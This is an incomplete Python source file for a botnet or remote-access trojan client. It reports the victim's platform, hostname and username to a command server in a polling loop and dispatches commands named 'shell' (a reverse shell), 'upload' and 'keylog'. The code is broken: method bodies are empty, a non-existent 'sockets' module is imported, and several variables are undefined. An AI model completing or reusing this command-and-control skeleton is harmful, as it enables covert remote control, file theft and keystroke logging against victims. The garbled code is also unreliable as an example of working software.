from datetime import datetime
import random
import sockets
import requests
import platform
class Bot(object):
	

	def __init__(self):
		self.platform = platform.system()
		

	def reverse_shell(self):

	def ping_server(self):
		r = requests.post(server + '/api/' + self.uid + 'status',
			{'platform': self.platform, 'hostname':self.hostname, 'username':self.username })
		return r.text

	def Main():
		while True:
			try:
				job = self.ping_server()
				if job:
					print(line)
					line = job
					split_cmd = job.split(" ")
					if len(split_cmd) > 0:
						cmd = split_cmd[0]
						args = split_cmd[1:]
						if cmd == 'shell':
							self.reverse_shell()
						if cmd == 'upload':
							
						if cmd == 'keylog':

			except: